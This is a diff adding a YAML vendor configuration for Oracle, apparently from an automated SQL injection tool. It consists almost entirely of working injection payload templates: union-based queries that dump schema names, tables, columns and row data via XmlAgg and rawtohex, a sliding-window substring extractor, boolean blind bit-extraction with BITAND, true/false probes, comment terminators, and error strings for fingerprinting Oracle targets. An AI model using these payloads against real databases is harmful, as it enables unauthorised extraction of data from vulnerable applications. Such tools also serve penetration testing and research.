@@ -1,0 +1,233 @@
+vendor: ""
+resource: 
+ info: |
+  SELECT 
+      version
+      || '${ENCLOSE_VALUE_SQL}' 
+      || SYS.DATABASE_NAME 
+      || '${ENCLOSE_VALUE_SQL}' 
+      || user 
+      || '${TRAIL_SQL}'
+  FROM v%24instance
+ schema: 
+  database: |
+   select
+       utl_raw.cast_to_varchar2(
+           CAST(
+               DBMS_LOB.SUBSTR(
+                   replace(
+                       replace(
+                           XmlAgg(
+                               XmlElement(
+                                   \"a\",
+                                   rawtohex(
+                                       '${ENCLOSE_VALUE_SQL}'
+                                       || s
+                                       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                   )
+                               ) order by s nulls last
+                           ).getClobVal(),
+                           '<a>',''
+                       ),
+                       '<%2Fa>',
+                       rawtohex('${SEPARATOR_CELL_SQL}')
+                   ) || rawtohex('${TRAIL_SQL}'),
+                   4000,
+                   1
+               ) AS VARCHAR(1024)
+           )
+       )
+   from (
+       select t.s 
+       from
+           (SELECT DISTINCT owner s FROM all_tables) t,
+           (SELECT DISTINCT owner s FROM all_tables) t1
+       where t.s >= t1.s
+       group by t.s
+       {limit}
+   )
+  table: |
+   select
+       utl_raw.cast_to_varchar2(
+           CAST(
+               DBMS_LOB.SUBSTR(
+                   replace(
+                       replace(
+                           XmlAgg(
+                               XmlElement(
+                                   \"a\",
+                                   rawtohex(
+                                       '${ENCLOSE_VALUE_SQL}'
+                                       || s
+                                       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                   )
+                               ) order by s nulls last
+                           ).getClobVal(),
+                           '<a>',
+                           ''
+                       ),
+                       '<%2Fa>',
+                       rawtohex('${SEPARATOR_CELL_SQL}')
+                   ) || rawtohex('${TRAIL_SQL}'),
+                   4000,
+                   1
+               ) AS VARCHAR(1024)
+           )
+       )
+   from (
+       select t.s 
+       from 
+           (SELECT DISTINCT table_name s FROM all_tables where owner = '${DATABASE}') t,
+           (SELECT DISTINCT table_name s FROM all_tables where owner = '${DATABASE}') t1
+       where t.s >= t1.s
+       group by t.s
+       {limit}
+   )
+  column: |
+   select
+       utl_raw.cast_to_varchar2(
+           CAST(
+               DBMS_LOB.SUBSTR(
+                   replace(
+                       replace(
+                           XmlAgg(
+                               XmlElement(
+                                   \"a\",
+                                   rawtohex(
+                                       '${ENCLOSE_VALUE_SQL}'
+                                       || s
+                                       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                   )
+                               ) order by s nulls last
+                           ).getClobVal(),
+                           '<a>',
+                           ''
+                       ),
+                       '<%2Fa>',
+                       rawtohex('${SEPARATOR_CELL_SQL}')
+                   ) || rawtohex('${TRAIL_SQL}'),
+                   4000,
+                   1
+               ) AS VARCHAR(1024)
+           )
+       )
+   from (
+       select t.s 
+       from
+           (SELECT DISTINCT column_name s FROM all_tab_columns where owner = '${DATABASE}' and table_name = '${TABLE}') t,
+           (SELECT DISTINCT column_name s FROM all_tab_columns where owner = '${DATABASE}' and table_name = '${TABLE}') t1
+       where t.s >= t1.s
+       group by t.s
+       {limit}
+   )
+  row: 
+   query: |
+    select
+        utl_raw.cast_to_varchar2(
+            CAST(
+                DBMS_LOB.SUBSTR(
+                    replace(
+                        replace(
+                            XmlAgg(
+                                XmlElement(
+                                    \"a\",
+                                    rawtohex(
+                                        '${ENCLOSE_VALUE_SQL}'
+                                        || s
+                                        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                    )
+                                ) order by s nulls last
+                            ).getClobVal(),
+                            '<a>',
+                            ''
+                        ),
+                        '<%2Fa>',
+                        rawtohex('${SEPARATOR_CELL_SQL}')
+                    ) || rawtohex('${TRAIL_SQL}'),
+                    4000,
+                    1
+                ) AS VARCHAR(1024)
+            )
+        )
+    from (
+        select t.s 
+        from 
+            (SELECT DISTINCT ${FIELDS} s FROM ${DATABASE}.${TABLE}) t,
+            (SELECT DISTINCT ${FIELDS} s FROM ${DATABASE}.${TABLE}) t1 
+        where t.s >= t1.s
+        group by t.s
+        {limit}
+    )
+   fields: 
+    field: "trim(to_char(${FIELD}))"
+    concat: "|| '%7f' ||"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   (
+       select
+           '${LEAD}'
+           || substr(
+               (${INJECTION}),
+               ${INDEX},
+               ${CAPACITY}
+           ) from dual
+   )
+  limit: "having count(*) between ${LIMIT} and 65536"
+  failsafe: "to_char(1337${INDICE}7330%2b1)"
+  calibrator: |
+   rpad(
+       '${CALIBRATOR_SQL}', 
+       1024, 
+       '${CALIBRATOR_SQL}'
+   ) s
+  limitBoundary: 1
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - "function.oci"
+    - "Warning: oci_parse()"
+    - "Warning: oci_execute()"
+    - "Warning: oci_fetch_array()"
+    - "Unclosed quotation mark after the character string '"
+ normal: 
+  indices: "union select ${INDICES} from dual"
+  capacity: |
+   (
+       SELECT 
+           '${LEAD}' 
+           || ${INDICE} 
+           || ${CALIBRATOR} 
+       FROM dual
+   )
+  orderBy: "order by 1337"
+ boolean: 
+  test: 
+   falses: 
+    - "1 = 0"
+    - "'a' %21= 'a'"
+    - "'b' %21= 'b'"
+    - "1 = 2"
+    - "1 %21= 1"
+    - "2 %21= 2"
+   trues: 
+    - "0 = 0"
+    - "'a' %21= 'b'"
+    - "'a' = 'a'"
+    - "1 = 1"
+    - "2 = 2"
+    - "1 %21= 2"
+   initialization: "0%2b1 = 1"
+   bit: |
+    0 != BITAND(
+        ascii(
+            substr(
+                ${INJECTION}, 
+                ${INDEX}, 
+                1
+            )
+        ), 
+        ${BIT}
+    )
+   length: "length(${INJECTION}) > ${INDEX}"
+  blind: "and ${TEST}"
